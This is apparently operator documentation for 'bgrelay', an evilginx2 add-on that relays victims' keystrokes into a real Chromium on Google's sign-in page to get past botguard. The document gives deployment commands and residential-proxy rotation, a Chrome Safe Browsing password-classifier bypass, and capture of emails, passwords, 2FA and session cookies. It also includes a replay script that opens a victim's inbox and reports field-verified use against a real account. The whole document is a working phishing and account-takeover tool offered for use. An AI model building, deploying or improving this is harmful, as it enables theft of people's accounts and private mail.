---
layout: default
title: Google real-browser relay
---

# Google real-browser relay (`bgrelay`)

## Why it exists

Google's **botguard** is *origin-bound*: the anti-abuse telemetry only validates when the
sign-in page actually runs on `accounts.google.com`. In a classic MITM the page runs on the
phishing domain, and Google rejects the login with "This browser or app may not be secure"
regardless of IP quality or TLS fingerprint — verified across datacenter, hosting and
residential exits, Go and Chrome TLS stacks. DOM-mirroring the page onto the phishing
origin also fails (the SPA self-navigates, CSP `frame-ancestors` kills framing, and without
scripts the form never renders).

The solution: the victim sees a **pixel-faithful mirror of a real sign-in happening in a
genuine browser on the genuine origin**, and every keystroke/click is relayed into that
real browser. Botguard always sees a legitimate Chromium on `accounts.google.com` through
a residential exit — verified to pass, including 2FA number-match.

## Architecture

```
Victim browser                evilginx2 :443                    bgrelay :9445 (sidecar)
──────────────                ──────────────                    ──────────────────────
GET  /<relay-lure>?t=…  ───►  lure token-gate, then
                              serve relay page AT the lure path
POST /__relay/api/start ────► proxy to sidecar ──────────────►  spawn patchright Chromium
POST /__relay/api/state ◄────  {state, screenshot(2x), input_box, ─ headful under Xvfb :99
POST /__relay/api/input  ───►   button_box, label, top_line}     locale + viewport mirrored
POST /__relay/api/click  ───►                                    from the victim's browser
                                  ▲                              ─ HTTP→SOCKS bridge :8119
                                  └── residential SOCKS5 exit ───┘   → accounts.google.com
```

- The sidecar runs a **patchright** (hardened CDP) Chromium, headful under Xvfb, per
  victim session, through the residential exit. Captures `{email, password, cookies}` to
  `~/bgrelay-store/<sid>.json` when the flow completes.
- The victim page livestreams a **card-crop screenshot** of the real page (captured at
  `device_scale_factor=2` for native sharpness, displayed 1:1) and overlays native
  input/button at geometry measured from the real DOM (`input_box`, `button_box`,
  floating `label`, redrawn `top_line`) — so typing, caret, Enter, copy-paste feel local.
- **Clicks anywhere on the card are replayed** onto the real page — every link in the
  mirror (Show password, Try another way, Forgot email?) works.
- CSD hardening: the overlay password field uses `type=text` +
  `-webkit-text-security:disc` (Chrome Safe Browsing password-page classifier bypass,
  field-verified).
- The page sends the victim's `navigator.languages` and `innerWidth/innerHeight`; the
  sidecar mirrors locale (vi/en) and viewport so Google serves the **same layout variant**
  (one-column ≤768px vs two-column) the victim's own browser would get.

## Deploying / updating

```bash
# page.html is loaded into RAM at start — ALWAYS restart after scp
scp tools/relay/bgrelay.py tools/relay/page.html <user>@<node>:/home/<user>/bgrelay/
ssh <node> 'sudo systemctl restart bgrelay && systemctl is-active bgrelay'
```

Environment (systemd unit): `RELAY_PORT=9445`,
`RELAY_SOCKS=socks5://<user>:<pass>@<residential>:<port>` — or a **comma-separated
pool** of exits (`socks5://u:p@h1:port,socks5://u:p@h2:port`) for automatic
rotation: ≥3 consecutive failures on one exit triggers a 30-min cooldown and the
bridge dials through the next healthy exit. Status via `GET /api/pool` (X-Op-Key).

## Sidecar API

| Endpoint | Body / params | Returns |
|---|---|---|
| `POST /api/start` | `{langs?, vw?, vh?, email?}` (page sends browser locale + viewport) | `{id}` |
| `GET /api/state` | `?id=&hs=<last-shot-hash>` (unchanged frames omit the screenshot — bandwidth delta) | `{state, hint, need_input, match_number?, screenshot?, card_w, input_box?, button_box?, label?, top_line?}` |
| `POST /api/input` | `{id, kind, value}` (`kind`: email/password/code) | `{ok}` |
| `POST /api/click` | `{id, x, y}` — percent-of-card coords | `{ok}` |
| `GET /api/res` | `?u=` — prefetched asset whitelist (not an open proxy) | cached asset |
| `GET /api/sessions` | header `X-Op-Key` | session list (operator only) |

States: `init → init_email → password (→ password_retry ≤3) → challenge (TOTP input or
Google-prompt wait, number-match shown inside the mirror) → done | error`.

## Capture & replay

On `done`: `~/bgrelay-store/<sid>.json` = `{id, email, password, cookies[], ua, ts}`
(only `.google.com`/`accounts.google.com`/`mail.google.com` cookies) — and the
capture is **auto-imported** into the evilginx session store (`POST /sessions/import`
via mTLS on loopback), so it appears in `sessions` immediately: use `open <id>`
or MCP `open_session` for a one-click signed-in browser.

Replay into a local signed-in Gmail (operator workstation):

```bash
pip install playwright            # uses the installed Chrome, no chromium download
scp <node>:~/bgrelay-store/<sid>.json Temp/gmail_session.json
python tools/relay/open_gmail_session.py     # opens local Chrome logged into Gmail
```

Field-verified end-to-end: capture of a real account with number-match 2FA, then cookie
replay opening the victim's inbox (52 unread) on the operator's machine.

## Self-testing doctrine

- **Render-only self-tests.** Start a session, verify geometry/styles/states, never submit
  fake credentials. Dozens of fake submits burn the residential exit — Google answers
  "This browser or app may not be secure" for ~30–60 min (or until exit swap).
- A 141-byte "It works" page or a botguard warning in the log means the anti-bot (JA4/UA)
  classified your client — check `journalctl -u evilginx2 -o cat`.
- Verify visual fidelity by **pixel measurement** (template-match, fill-color sampling),
  not by eyeballing; vision-model QA can hallucinate defects — settle disputes with pixels.

## Known limits

- Google-prompt (phone push) requires the victim's phone — the mirror shows it and the
  sidecar waits; number-match digits appear exactly once, inside the real card.
- Abandoned sessions can leave zombie chromium processes — `pkill -x chromium` when load
  rises (one leak event hit 81 processes / 3.3 GB).
- `page.html` and `bgrelay.py` both reload only on service restart.
